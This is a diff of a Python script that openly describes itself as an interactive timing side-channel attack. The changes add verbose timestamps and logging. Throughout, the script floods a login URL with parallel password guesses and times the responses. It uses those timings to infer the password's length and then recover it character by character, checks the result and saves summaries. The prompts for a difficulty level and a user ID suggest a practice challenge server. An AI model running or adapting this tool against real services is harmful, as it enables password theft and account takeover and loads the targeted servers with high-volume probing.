@@ -1,14 +1,15 @@
 #!/usr/bin/env python3
 """
-Interactive Timing Side-Channel Attack (enhanced)
+Interactive Timing Side-Channel Attack (enhanced, verbose timestamps)
 
-Features added:
-- High precision timing prints (12 decimal places)
-- Start / end timestamps (ISO) and elapsed times for whole run and each discovered char
-- Cleaner interactive config + ability to re-edit values before running
-- Save short run summary to a timestamped .txt file
-- Ranking mode (2-stage): quick measurements -> pick top-K -> remeasure top-K more times
-- No progress/loading bars (clean console output)
+Adds:
+- Timestamps at run start/end, phase start/end, and per-position start/end
+- Detailed per-position reports:
+  * quick-stage top-K candidates (char, median, samples)
+  * full-stage re-measured candidates (char, median, samples) and chosen char
+  * elapsed times: since run start and since position start
+- Final delta time for whole run
+- Saves JSON + TXT summary (same as before)
 """
 
 import requests
@@ -27,11 +28,9 @@ MAX_LENGTH = 32
 
 # --- Timing helpers ---------------------------------------------------------
 def perf_time() -> float:
-    """High-resolution timer alias."""
     return time.perf_counter()
 
 def fmt_time(t: float) -> str:
-    """Format a float time with high precision (12 decimal places)."""
     return f"{t:.12f}s"
 
 def now_iso() -> str:
@@ -39,7 +38,6 @@ def now_iso() -> str:
 
 # --- Network measurement ---------------------------------------------------
 def measure_time(username: str, password: str, difficulty: int, timeout: float = 10.0) -> float:
-    """Measure response time for a single password guess. Returns elapsed seconds or 0 on error."""
     url = f"{BASE_URL}/?user={username}&password={password}&difficulty={difficulty}"
     start = perf_time()
     try:
@@ -50,7 +48,6 @@ def measure_time(username: str, password: str, difficulty: int, timeout: float =
 
 def parallel_measurements(username: str, password: str, difficulty: int,
                           measurements: int, workers: int) -> List[float]:
-    """Run `measurements` times in parallel and return the list of positive timings."""
     times: List[float] = []
     with ThreadPoolExecutor(max_workers=workers) as executor:
         futures = [executor.submit(measure_time, username, password, difficulty) for _ in range(measurements)]
@@ -69,13 +66,6 @@ def crack_character_with_ranking(username: str, known_password: str, password_le
                                  quick_measurements: int, quick_workers: int,
                                  full_measurements: int, full_workers: int,
                                  top_k: int) -> Tuple[str, float, Dict]:
-    """
-    Two-stage ranking:
-      1) quick_measurements for each candidate char (cheap)
-      2) pick top_k candidates by median quick time
-      3) re-measure only those candidates with full_measurements to decide
-    Returns: (best_char, best_time, debug-info)
-    """
     position = len(known_password)
     padding_length = password_length - position - 1
     padding = "a" * padding_length
@@ -87,7 +77,8 @@ def crack_character_with_ranking(username: str, known_password: str, password_le
         times = parallel_measurements(username, test_pwd, difficulty, quick_measurements, quick_workers)
         med = median_time_from_list(times)
         debug["quick"].append({"char": ch, "pwd": test_pwd, "median": med, "samples": len(times)})
-    # sort quick stage descending by median
+
+    # sort quick stage descending by median and pick top_k
     debug["quick"].sort(key=lambda x: x["median"], reverse=True)
     top_candidates = debug["quick"][:top_k]
 
@@ -106,7 +97,6 @@ def crack_character_with_ranking(username: str, known_password: str, password_le
 # --- Non-ranking simple character crack -----------------------------------
 def crack_character_simple(username: str, known_password: str, password_length: int,
                            difficulty: int, measurements: int, workers: int) -> Tuple[str, float, Dict]:
-    """Test every candidate char with `measurements` and return best by median."""
     position = len(known_password)
     padding_length = password_length - position - 1
     padding = "a" * padding_length
@@ -123,17 +113,21 @@ def crack_character_simple(username: str, known_password: str, password_length: 
 
 # --- Phase 1: find length --------------------------------------------------
 def find_password_length(username: str, difficulty: int, measurements: int, workers: int) -> Tuple[int, Dict]:
-    """Measure median times for 'a' * length for lengths 1..MAX_LENGTH and pick max."""
+    start_iso = now_iso()
+    start_perf = perf_time()
+    print(f"\n[PHASE 1 START] Finding password length at {start_iso}")
     length_times = []
     for length in range(1, MAX_LENGTH + 1):
         test_pwd = "a" * length
         times = parallel_measurements(username, test_pwd, difficulty, measurements, workers)
         med = median_time_from_list(times)
         length_times.append({"length": length, "median": med, "samples": len(times)})
-        print(f"[Length {length:2d}] {test_pwd[:10]:10s} -> median {fmt_time(med)} (samples={len(times)})")
-    # choose length with maximum median time
+        print(f"[{now_iso()}] Length {length:2d} -> median {fmt_time(med)} (samples={len(times)})")
+
     best = max(length_times, key=lambda x: x["median"])
-    return best["length"], {"length_times": length_times, "picked": best}
+    end_perf = perf_time()
+    print(f"[PHASE 1 END] Completed at {now_iso()}  duration {fmt_time(end_perf - start_perf)}")
+    return best["length"], {"length_times": length_times, "picked": best, "phase_start": start_iso, "phase_end": now_iso(), "phase_duration": end_perf - start_perf}
 
 # --- Phase 2: crack password ------------------------------------------------
 def crack_password(username: str, difficulty: int, length: int,
@@ -142,49 +136,114 @@ def crack_password(username: str, difficulty: int, length: int,
                    full_measurements: int, full_workers: int,
                    top_k: int,
                    simple_measurements: int, simple_workers: int) -> Tuple[str, List[Dict]]:
-    """
-    Crack password character-by-character.
-    Returns discovered password and a log list with per-character metadata.
-    """
     discovered = ""
     per_char_log = []
+    run_start_perf = perf_time()
+    run_start_iso = now_iso()
+    print(f"\n[PHASE 2 START] Cracking password of length {length} at {run_start_iso} (use_ranking={use_ranking})")
 
-    overall_pos_start = perf_time()
     for pos in range(length):
+        pos_start_perf = perf_time()
         pos_start_iso = now_iso()
         print("\n" + "-" * 70)
-        print(f"[{pos+1}/{length}] Starting char discovery at {pos_start_iso}")
-        print(f"Known so far: '{discovered}'")
+        print(f"[{pos+1}/{length}] Position start at {pos_start_iso}  Known so far: '{discovered}'")
+        # If ranking: quick stage -> show top_k -> full stage -> show full results
         if use_ranking:
-            ch, med, debug = crack_character_with_ranking(
+            # Quick stage (we do the quick probes inside the ranking function, but we want to print the quick top_k)
+            # We will call the ranking function but first run a quick-only pass to get quick results for printing
+            # Quick-only pass
+            quick_debug = {"quick": []}
+            padding_length = length - len(discovered) - 1
+            padding = "a" * padding_length
+            for ch in CHARSET:
+                test_pwd = discovered + ch + padding
+                q_times = parallel_measurements(username, test_pwd, difficulty, quick_measurements, quick_workers)
+                q_med = median_time_from_list(q_times)
+                quick_debug["quick"].append({"char": ch, "pwd": test_pwd, "median": q_med, "samples": len(q_times)})
+            quick_debug["quick"].sort(key=lambda x: x["median"], reverse=True)
+            top_candidates = quick_debug["quick"][:top_k]
+
+            print(f"\n[{now_iso()}] Quick-stage (top {top_k}) candidates:")
+            for i, c in enumerate(top_candidates, start=1):
+                print(f"  {i}. '{c['char']}'  pwd='{c['pwd']}'  median={fmt_time(c['median'])}  samples={c['samples']}")
+
+            # Now run the full ranking function (which re-measures top candidates)
+            chosen_char, chosen_med, debug = crack_character_with_ranking(
                 username, discovered, length, difficulty,
                 quick_measurements, quick_workers,
                 full_measurements, full_workers,
                 top_k
             )
-            method = "ranking"
-        else:
-            ch, med, debug = crack_character_simple(
-                username, discovered, length, difficulty,
-                simple_measurements, simple_workers
-            )
-            method = "simple"
 
-        discovered += ch
-        pos_end = perf_time()
-        elapsed = pos_end - overall_pos_start
-        print(f"✓ Selected char '{ch}'  median={fmt_time(med)}  (method={method})")
-        print(f"Timestamp (char done): {now_iso()}  elapsed for this char (since start of char loop): {fmt_time(elapsed)}")
-        # append per-character record
+            print(f"\n[{now_iso()}] Full-stage re-measure results (top candidates):")
+            for i, c in enumerate(debug["full"], start=1):
+                marker = " <-- SELECTED" if c["char"] == chosen_char else ""
+                print(f"  {i}. '{c['char']}'  pwd='{c['pwd']}'  median={fmt_time(c['median'])}  samples={c['samples']}{marker}")
+
+            selected_char = chosen_char
+            selected_median = chosen_med
+            method = "ranking"
+
+            # For richer logging, also show the quick-stage times (which moved forward)
+            moved_chars = [{"char": c["char"], "quick_median": c["median"], "quick_samples": c["samples"]} for c in top_candidates]
+
+        else:
+            # Simple mode: measure all chars fully and print top few
+            results = []
+            padding_length = length - len(discovered) - 1
+            padding = "a" * padding_length
+            for ch in CHARSET:
+                test_pwd = discovered + ch + padding
+                times = parallel_measurements(username, test_pwd, difficulty, simple_measurements, simple_workers)
+                med = median_time_from_list(times)
+                results.append({"char": ch, "pwd": test_pwd, "median": med, "samples": len(times)})
+            results.sort(key=lambda x: x["median"], reverse=True)
+
+            print(f"\n[{now_iso()}] Simple-mode top 5 candidates:")
+            for i, c in enumerate(results[:5], start=1):
+                print(f"  {i}. '{c['char']}'  pwd='{c['pwd']}'  median={fmt_time(c['median'])}  samples={c['samples']}")
+
+            selected_char = results[0]["char"]
+            selected_median = results[0]["median"]
+            method = "simple"
+            moved_chars = [{"char": r["char"], "median": r["median"], "samples": r["samples"]} for r in results[:top_k]]
+
+        # finalize this position
+        discovered += selected_char
+        pos_end_perf = perf_time()
+        pos_elapsed = pos_end_perf - pos_start_perf
+        run_elapsed = pos_end_perf - run_start_perf
+
+        print(f"\n[{now_iso()}] Selected '{selected_char}'  median={fmt_time(selected_median)}  (method={method})")
+        print(f"Position finished at {now_iso()}")
+        print(f"Elapsed for this position: {fmt_time(pos_elapsed)}")
+        print(f"Elapsed since phase start: {fmt_time(run_elapsed)}")
+
+        # additionally print which letters moved forward each time (with quick times if ranking)
+        if use_ranking:
+            print("\nLetters that moved to full-stage (with quick-stage medians):")
+            for idx, mc in enumerate(moved_chars, start=1):
+                print(f"  {idx}. '{mc['char']}' quick_median={fmt_time(mc['quick_median'])} samples={mc['quick_samples']}")
+        else:
+            print("\nTop candidates summary (simple mode):")
+            for idx, mc in enumerate(moved_chars, start=1):
+                print(f"  {idx}. '{mc['char']}' median={fmt_time(mc['median'])} samples={mc['samples']}")
+
+        # record per-character log
         per_char_log.append({
             "position": pos,
-            "char": ch,
-            "selected_median": med,
+            "char": selected_char,
+            "selected_median": selected_median,
             "method": method,
-            "debug": debug,
-            "timestamp": now_iso(),
-            "elapsed_since_pos_start": elapsed
+            "moved_chars": moved_chars,
+            "timestamp_end": now_iso(),
+            "elapsed_for_position_seconds": pos_elapsed,
+            "elapsed_since_phase_start_seconds": run_elapsed
         })
+
+    total_end_perf = perf_time()
+    total_elapsed = total_end_perf - run_start_perf
+    print(f"\n[PHASE 2 END] Completed at {now_iso()}  total phase duration: {fmt_time(total_elapsed)}")
     return discovered, per_char_log
 
 # --- Verification ----------------------------------------------------------
@@ -205,7 +264,6 @@ def save_run_summary(output_dir: str,
                      start_iso: str,
                      end_iso: str,
                      total_elapsed: float) -> str:
-    """Save a concise summary JSON + human-readable txt file and return filename."""
     os.makedirs(output_dir, exist_ok=True)
     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
     json_fname = os.path.join(output_dir, f"run_summary_{ts}.json")
@@ -238,7 +296,11 @@ def save_run_summary(output_dir: str,
             tf.write(f"  - Password length: {password_length}\n")
             tf.write(f"  - Discovered password: {discovered_password}\n")
             tf.write(f"  - Per-character results: {len(per_char_log) if per_char_log else 0}\n")
-            tf.write("\n(For details see JSON file.)\n")
+            tf.write("\nPer-character details (short):\n")
+            if per_char_log:
+                for entry in per_char_log:
+                    tf.write(f"  - pos {entry['position']}: '{entry['char']}'  median={fmt_time(entry['selected_median'])}  elapsed_pos={fmt_time(entry['elapsed_for_position_seconds'])}\n")
+            tf.write("\n(For full details see JSON file.)\n")
         print(f"\n✓ Summary saved to:\n  - {txt_fname}\n  - {json_fname}")
         return txt_fname
     except Exception as e:
@@ -261,7 +323,6 @@ def get_int_input(prompt: str, default: int, min_val: int = 1, max_val: int = 10
             print("Please enter a valid integer")
 
 def interactive_menu():
-    # defaults
     cfg = {
         "username": "",
         "difficulty": 1,
@@ -281,10 +342,9 @@ def interactive_menu():
     }
 
     print("\n" + "=" * 70)
-    print("    INTERACTIVE TIMING SIDE-CHANNEL (enhanced)")
+    print("    INTERACTIVE TIMING SIDE-CHANNEL (verbose timestamps)")
     print("=" * 70)
 
-    # Username
     while True:
         uname = input("Enter your username/ID: ").strip()
         if uname:
@@ -292,14 +352,10 @@ def interactive_menu():
             break
         print("Username cannot be empty.")
 
-    # difficulty
     cfg["difficulty"] = get_int_input("Difficulty (1-10)", default=cfg["difficulty"], min_val=1, max_val=10)
-
-    # quick config values
     cfg["measurements"] = get_int_input("Measurements per probe (default for length finding)", default=cfg["measurements"], min_val=1, max_val=200)
     cfg["workers"] = get_int_input("Parallel workers (default for length finding)", default=cfg["workers"], min_val=1, max_val=200)
 
-    # ranking toggle
     use_rank_raw = input(f"Use ranking two-stage mode? (y/n) [{'y' if cfg['use_ranking'] else 'n'}]: ").strip().lower()
     cfg["use_ranking"] = (use_rank_raw != "n")
 
@@ -319,27 +375,26 @@ def interactive_menu():
             print(f"  - {k}: {v}")
     print("=" * 70)
 
-    # Choose action
     print("What would you like to do?")
     print("1. Find password length only (Phase 1)")
     print("2. Crack password (Phase 2) - requires known/assumed length")
     print("3. Full attack (Phase 1 + Phase 2)")
     choice = get_int_input("Enter choice (1-3)", default=3, min_val=1, max_val=3)
 
-    start_iso = now_iso()
-    overall_start = perf_time()
+    run_start_iso = now_iso()
+    run_start_perf = perf_time()
+    print(f"\n[RUN START] {run_start_iso}")
 
     password_length = None
     discovered_password = None
     per_char_log = None
 
     if choice == 1:
-        print(f"\nStarting Phase 1 (finding length) at {start_iso}")
+        print(f"\n=== PHASE 1 ===")
         password_length, length_debug = find_password_length(cfg["username"], cfg["difficulty"], cfg["measurements"], cfg["workers"])
         print(f"\nDetected length: {password_length}")
     elif choice == 2:
         length_val = get_int_input(f"Enter known password length (1-{MAX_LENGTH})", default=8, min_val=1, max_val=MAX_LENGTH)
-        print(f"\nStarting Phase 2 at {start_iso}")
         discovered_password, per_char_log = crack_password(
             cfg["username"], cfg["difficulty"], length_val,
             cfg["use_ranking"],
@@ -349,7 +404,7 @@ def interactive_menu():
             cfg["simple_measurements"], cfg["simple_workers"]
         )
     elif choice == 3:
-        print(f"\nStarting Full Attack at {start_iso}")
+        print(f"\n=== PHASE 1 ===")
         password_length, length_debug = find_password_length(cfg["username"], cfg["difficulty"], cfg["measurements"], cfg["workers"])
         print(f"\nDetected length: {password_length}")
         discovered_password, per_char_log = crack_password(
@@ -361,29 +416,27 @@ def interactive_menu():
             cfg["simple_measurements"], cfg["simple_workers"]
         )
 
-    overall_end = perf_time()
-    end_iso = now_iso()
-    total_elapsed = overall_end - overall_start
+    run_end_perf = perf_time()
+    run_end_iso = now_iso()
+    total_elapsed = run_end_perf - run_start_perf
 
-    # Verification & printing
+    print("\n" + "=" * 70)
+    print(f"[RUN END] {run_end_iso}  Total run duration: {fmt_time(total_elapsed)}")
+    print("=" * 70)
+
     if discovered_password:
-        print("\n" + "=" * 70)
-        print("VERIFICATION")
-        print("=" * 70)
+        print("\nVerification:")
         ok = verify_password(cfg["username"], discovered_password, cfg["difficulty"])
         if ok:
-            print(f"✓ SUCCESS! Password: '{discovered_password}'")
+            print(f"✓ SUCCESS - password '{discovered_password}' verified")
         else:
-            print(f"✗ FAILED - attempted password '{discovered_password}' did not verify as correct")
-        print(f"Run started: {start_iso}")
-        print(f"Run ended:   {end_iso}")
-        print(f"Total duration: {fmt_time(total_elapsed)}")
+            print(f"✗ Attempted password '{discovered_password}' did not verify")
+
         # Save summary
         config_for_save = {k: cfg[k] for k in cfg if not k.startswith("simple_") or cfg["use_ranking"] is False}
-        save_run_summary(cfg["output_dir"], config_for_save, password_length, discovered_password, per_char_log, start_iso, end_iso, total_elapsed)
+        save_run_summary(cfg["output_dir"], config_for_save, password_length, discovered_password, per_char_log, run_start_iso, run_end_iso, total_elapsed)
     elif password_length:
-        print(f"\nPassword length found: {password_length}")
-        print("Run again with option 2 to crack the password!")
+        print(f"\nPassword length found: {password_length} (no cracking run performed)")
 
 def main():
     try:
